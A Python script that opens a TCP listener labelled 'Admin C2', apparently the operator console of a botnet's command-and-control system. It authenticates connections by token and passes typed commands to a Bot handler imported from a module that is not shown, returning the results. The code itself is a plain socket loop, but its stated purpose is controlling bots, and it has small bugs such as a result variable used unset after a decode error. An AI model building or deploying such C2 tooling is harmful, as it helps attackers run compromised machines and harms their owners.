from colorama import Fore
from src import Bot
import dotenv
import socket
import os

dotenv.load_dotenv()

HOST = str(os.environ.get('SOCKET_HOST'))
PORT = int(os.environ.get('SOCKET_PORT'))
BUFFER_SIZE = int(os.environ.get('BUFFER_SIZE'))

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind((HOST, PORT))
sock.listen(5)

clear_console = lambda: os.system('cls' if os.name in ('os', 'nt') else 'clear')
clear_console()

print(f'Admin C2 started on: {HOST}:{PORT}\n')

while True:
    conn, addr = sock.accept()
    bot = Bot()

    print(f'[{Fore.GREEN}CONNECTION{Fore.RESET}]: Connection from {addr[0]}:{addr[1]}')

    with conn:
        while True:
            try:
                conn.send(b'Login: ')
                login_token = conn.recv(BUFFER_SIZE).decode('utf-8').strip()
                
                res = bot.login(login_token)

                if res['message'] == 'successfully logged in':
                    while True:
                        username = res['username']
                        pwd = f'\n\n{username}@admin: '

                        conn.send(bytes(pwd, 'utf-8'))
                        command = conn.recv(BUFFER_SIZE).decode('utf-8').strip()

                        try:
                            command_res = bot.handle_command(command, command.split(' '))

                        except UnicodeDecodeError:
                            conn.send(b'invalid command.')

                        if command_res['message'] == '[EXIT]':
                            conn.send(b'\nBye!\n')
                            conn.close()
                            print(f'[{Fore.RED}DISCONNECTION{Fore.RESET}]: Disconnection from {addr[0]}:{addr[1]}')
                            break

                        else:
                            conn.send(bytes(command_res['message'], 'utf-8'))

                else:
                    conn.send(b'Invalid loggin. This incident will be logged!\n')
                    conn.close()
                    print(f'[{Fore.RED}DISCONNECTION{Fore.RESET}]: Disconnection from {addr[0]}:{addr[1]}')
                    break

            except OSError:
                conn.close()
                break
        